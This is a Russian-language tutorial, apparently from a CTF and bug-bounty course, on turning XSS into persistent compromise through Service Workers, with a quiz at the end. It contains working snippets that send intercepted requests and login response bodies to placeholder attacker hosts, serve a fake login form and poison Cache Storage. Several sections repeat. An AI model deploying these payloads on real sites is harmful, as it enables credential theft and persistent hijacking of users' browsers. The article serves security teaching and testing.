---
id: web-service-worker
title: "Service Worker и атаки на PWA"
category: web
parent: web-browser-advanced
difficulty: medium
order: 2
tags: [service-worker, pwa, xss, persistent, cache, client-side]
prerequisites: [web-xss, web-same-origin-cors]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 36
summary: "Как Service Worker превращает разовую XSS в постоянный перехват трафика и как это эксплуатировать."
---

**Service Worker (SW)** — это фоновый скрипт, который браузер регистрирует для origin и который может **перехватывать все сетевые запросы** страницы (fetch-события), кэшировать ответы и работать даже при закрытой вкладке (в рамках PWA). Это мощнейший примитив: XSS, позволяющий зарегистрировать SW, превращается в **постоянный** компромисс origin — перехват запросов, подмена ответов, кража токенов из будущих сессий. SW — ключ к устойчивости и к задачам «XSS, которая переживает перезагрузку».

## Теория: жизненный цикл и область действия

- SW регистрируется через `navigator.serviceWorker.register('/sw.js')`.
- **Scope** определяется директорией скрипта: `/sw.js` → scope `/`; `/app/sw.js` → scope `/app/`. По умолчанию SW контролирует только свой scope.
- Заголовок `Service-Worker-Allowed: /` позволяет расширить scope.
- SW требует **secure context** (HTTPS или localhost).
- Управление начинается после перезагрузки страницы (или через `clients.claim()`).

Ошибка конфигурации: **scope слишком широкий** или возможность **загрузить `sw.js` с чужого хоста** (например, через JSONP/загрузку файла) — тогда вы контролируете все запросы origin.

## Теория: как SW усиливает XSS

Обычная XSS действует, пока открыта вкладка. SW — нет:

1. **Persistent hook.** SW живёт до явной отмены регистрации; жертва может закрыть вкладку — SW продолжит перехватывать запросы.
2. **Request interception.** `fetch`-событие может читать/модифицировать **все** запросы origin: украсть токены из заголовков/URL, подменить ответ, отдать малварь.
3. **Cache poisoning клиента.** SW кэширует подменённые ответы — «постоянная» отравленная версия приложения.
4. **Cross-tab.** Один SW контролирует все вкладки origin.

Итог: если у вас есть HTML/JS-инъекция, зарегистрировать SW = закрепиться в браузере жертвы.

## Теория: векторы и ошибки

- **XSS → SW.** Любая XSS позволяет `navigator.serviceWorker.register('/evil.js')` (если файл достижим) или через `URL.createObjectURL`.
- **Import scripts.** SW может `importScripts('https://attacker/x.js')` — если CSP это разрешает.
- **Пользовательские данные как `sw.js`.** Если приложение отдаёт пользовательский контент как JS с `Service-Worker-Allowed`, это прямая регистрация.
- **Широкий scope + поддомен.** SW на `evil.target.com` не покроет `target.com` (разные origin), но SW на `target.com` покроет всё.
- **Отмена.** `navigator.serviceWorker.getRegistrations().then(r=>r.forEach(x=>x.unregister()))` — защита/очистка.

## Инструменты и команды

Список зарегистрированных SW в DevTools → Application → Service Workers. Из консоли:

```js
navigator.serviceWorker.getRegistrations().then(rs => console.log(rs));
```

Проверить, отдаётся ли `sw.js` и с каким scope:

```bash
curl -s -I https://target.local/sw.js | grep -iE 'content-type|service-worker-allowed'
```

Проверить доступность загрузки SW с чужого/пользовательского контента:

```bash
curl -s 'https://target.local/uploads/user.js' -I | grep -iE 'content-type|service-worker-allowed'
```

## Разобранный пример: XSS → постоянный перехват

Шаг 1. Подтверждаем XSS (например, `alert(1)`).

Шаг 2. Регистрируем SW, который перехватывает запросы и шлёт cookie/токены на ваш сервер:

```js
// evil-sw.js (размещён на вашем хосте или как blob)
self.addEventListener('fetch', (e) => {
  const u = new URL(e.request.url);
  if (u.pathname.startsWith('/api/')) {
    // логируем запрос на сервер атакующего
    fetch('https://attacker.example/log?u=' + encodeURIComponent(e.request.url));
  }
});
```

Шаг 3. На уязвимой странице:

```js
navigator.serviceWorker.register('https://attacker.example/evil-sw.js', {scope: '/'});
```

Для кросс-ориджин SW нужен CORS/`Service-Worker-Allowed`; чаще SW кладут в same-origin-достижимый путь или используют blob.

Шаг 4. После перезагрузки SW контролирует origin: запросы к `/api/` логируются. Докажите утечку в отчёте.

## Разобранный пример: подмена ответа (клиентская cache poisoning)

SW может вернуть жертве подменённый ответ на любой путь:

```js
self.addEventListener('fetch', (e) => {
  if (e.request.url.endsWith('/login')) {
    e.respondWith(new Response('<form action="https://attacker/">...', {
      headers: {'Content-Type': 'text/html'}
    }));
  }
});
```

Так крадутся учётные данные даже без изменения сервера — «постоянный» фишинг внутри origin.

## Частые ошибки

- **Считать XSS разовой.** С SW она становится персистентной.
- **Игнорировать scope.** SW на поддомене не покроет основной домен; scope задаёт охват.
- **Забывать про HTTPS.** SW работает только в secure context.
- **Не проверять `Service-Worker-Allowed`.** Он может разрешить SW с неожиданного пути.
- **Не уметь чистить.** Для защиты/теста нужно уметь `unregister` и чистить Cache Storage.

## Механика персистентности: почему SW так опасен

Service Worker — единственный веб-механизм, который **переживает** закрытие вкладки и очистку JS-контекста. Он регистрируется один раз и продолжает работать.

| Свойство | Значение |
|----------|----------|
| Область (scope) | обычно `/` — весь origin |
| Жизненный цикл | install → activate → fetch |
| Персистентность | сохраняется после закрытия вкладки |
| Хранилище | Cache Storage + IndexedDB |
| Обновление | проверяется при навигации, старый SW живёт до активации нового |
| Требование | HTTPS (или localhost) |
| Управление | `navigator.serviceWorker.register(script, {scope})` |

```javascript
// регистрация SW с областью на весь origin
navigator.serviceWorker.register('/sw.js', { scope: '/' });
```

Ключевой момент для атакующего: если есть XSS и возможность зарегистрировать SW, вредоносный код становится **постоянным** — он отвечает на запросы и после ухода XSS-точки.

## Перехват fetch: полная картина возможностей

Внутри SW обработчик `fetch` видит **каждый** запрос страницы и может его подменить.

```javascript
// sw.js — перехват всех запросов
self.addEventListener('fetch', (event) => {
  event.respondWith(
    fetch(event.request).then((resp) => {
      // например, воруем тело запроса с токеном и подменяем ответ
      if (event.request.url.includes('/api/me')) {
        return new Response('<script>exfil()</script>', {
          headers: { 'Content-Type': 'text/html' }
        });
      }
      return resp;
    })
  );
});
```

Возможности: подмена HTML (XSS на каждой навигации), кража тела POST (креды, токены), подмена API-ответов (обход логики), кэширование подделок (клиентский cache poisoning).

## Векторы внедрения вредоносного SW

| Вектор | Как работает |
|--------|--------------|
| Stored XSS | зарегистрировать SW с `/` scope |
| JSONP/importScripts | `importScripts('//attacker/sw.js')` в легитимном SW |
| Подмена SW-скрипта | если `/sw.js` отдаётся с user-content |
| Открытый редирект | SW-скрипт с чужого домена через редирект |
| Устаревший SW | старый SW не обновляется и продолжает работать |
| Shared scope | два приложения на одном origin делят SW |

```bash
# проверяем, какие SW зарегистрированы (в браузере)
# DevTools -> Application -> Service Workers
# или из консоли:
navigator.serviceWorker.getRegistrations().then(r => console.log(r))
```

## Заголовок Service-Worker-Allowed и scope-эскалация

По умолчанию SW может управлять только своей директорией. Заголовок `Service-Worker-Allowed: /` расширяет scope.

```bash
# если /js/sw.js отдаётся с этим заголовком, он может контролировать весь origin
curl -sI https://app.example/js/sw.js | grep -i 'service-worker-allowed'
# Service-Worker-Allowed: /
```

Опасность: любой XSS в подкаталоге (`/js/...`) получает SW на весь сайт. Проверяйте этот заголовок при аудите.

## Разобранный пример: XSS → постоянный перехват

```javascript
// 1) через найденную XSS регистрируем SW
navigator.serviceWorker.register('/uploads/evil-sw.js', {scope: '/'});
// 2) evil-sw.js (загружен на тот же origin) перехватывает запросы
self.addEventListener('fetch', (e) => {
  if (e.request.url.endsWith('/login')) {
    // сохраняем пароль, отправляя его на наш сервер
    e.respondWith(fetch(e.request.clone()).then(r => {
      r.clone().text().then(b => fetch('//attacker/steal?b='+btoa(b)));
      return r;
    }));
  }
});
// 3) даже после исправления XSS SW продолжает работать
```

Доказательство: после «исправления» XSS вредоносный перехват сохраняется — нужно явно дерегистрировать SW.

## Что делать дальше / решение

1. **Проверьте заголовки.** `Service-Worker-Allowed`, `Content-Type` SW-скрипта.
2. **Найдите внедряемый SW.** User-content в `/sw.js` или путь с XSS.
3. **Проверьте importScripts.** Может ли легитимный SW подгружать чужой код.
4. **Смоделируйте XSS→SW.** Зарегистрировать SW через XSS и перехватить запрос.
5. **Оцените персистентность.** Работает ли перехват после закрытия вкладки/фикса.
6. **Зафиксируйте PoC.** Скрипт SW + перехваченные данные.

## Практика и справочники

- **PortSwigger Academy** — «Service worker» (тема client-side).
- **MDN** — Service Worker API (scope, lifecycle).
- **HackTricks** — «Service Workers».
- **Google Web Fundamentals** — «Service Workers: an Introduction».

## Cache Storage и клиентский cache poisoning

Service Worker может кэшировать поддельные ответы так, что они переживут перезагрузку и очистку сети.

```javascript
// sw.js: кладём в кэш поддельный ответ
self.addEventListener('fetch', (e) => {
  if (e.request.url.endsWith('/app.js')) {
    e.respondWith(
      caches.open('poison').then((c) =>
        c.put('/app.js', new Response('/* malicious */', {
          headers: { 'Content-Type': 'application/javascript' }
        }))
      ).then(() => caches.match('/app.js'))
    );
  }
});
```

Последствие: даже если сервер исправлен, браузер продолжает отдавать подделку из Cache Storage. Это делает SW-атаки особенно живучими.

## Защита и её обходы

| Защита | Обход |
|--------|-------|
| SW-скрипт с `Content-Type: application/javascript` | внедрение через user-content с правильным типом |
| Ограничение scope директорией | XSS в нужной директории / `Service-Worker-Allowed` |
| `importScripts` с same-origin | редирект или JSONP-подгрузка |
| CSP `worker-src` | если не задан — регистрация проходит |
| Проверка обновлений | старый SW живёт до активации нового |

```bash
# проверить CSP на наличие worker-src
curl -sI https://app.example/ | grep -i 'content-security-policy'
# отсутствие worker-src -> SW можно зарегистрировать с любого разрешённого источника
```

## Что делать дальше / решение

1. Проверьте заголовки SW-скриптов и `Service-Worker-Allowed`.
2. Найдите возможность внедрить SW (XSS, user-content, JSONP).
3. Смоделируйте перехват `fetch` и кражу запросов.
4. Оцените персистентность и Cache Storage.
5. Оформите PoC: скрипт SW + перехваченные данные.

## Практика

- **MDN Service Worker API** — lifecycle, scope, Cache Storage.
- **PortSwigger** — client-side «Service workers».
- **HackTricks** — `Service Workers`.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Почему Service Worker делает XSS персистентной?"
  options:
    - "Он живёт после закрытия вкладки и перехватывает запросы origin"
    - "Он шифрует cookies"
    - "Он меняет DNS"
    - "Он работает только в HTTPS"
  answer: 0
  explanation: "SW регистрируется на origin и перехватывает fetch-события."
- question: "Чем определяется scope Service Worker?"
  options:
    - "Директорией скрипта (и заголовком `Service-Worker-Allowed`)"
    - "Cookie"
    - "Портом"
    - "User-Agent"
  answer: 0
  explanation: "`/sw.js` → scope `/`; заголовок может расширить scope."
- question: "Какое событие позволяет SW читать/менять запросы?"
  options:
    - "`fetch`"
    - "`click`"
    - "`load`"
    - "`message`"
  answer: 0
  explanation: "Обработчик `fetch` может вызывать `respondWith`."
- question: "Что нужно для регистрации SW?"
  options:
    - "Secure context (HTTPS или localhost)"
    - "Только HTTP"
    - "FTP"
    - "SMTP"
  answer: 0
  explanation: "SW требует secure context."
- question: "Как очистить SW при защите/тесте?"
  options:
    - "`navigator.serviceWorker.getRegistrations().then(rs=>rs.forEach(r=>r.unregister()))`"
    - "Очистить cookie"
    - "Сменить пароль"
    - "Перезагрузить DNS"
  answer: 0
  explanation: "Регистрации снимаются через `unregister()`."
```

## Где пригодится

- **CTF (Web):** задачи, где XSS нужно «закрепить» или перехватить запросы.
- **Bug bounty:** XSS с регистрацией SW — повышение severity до persistent.
- **Пентест:** аудит PWA, scope SW, `Service-Worker-Allowed`.
- **Работа (AppSec/Dev):** контроль scope SW, CSP для `worker-src`, очистка при инцидентах.
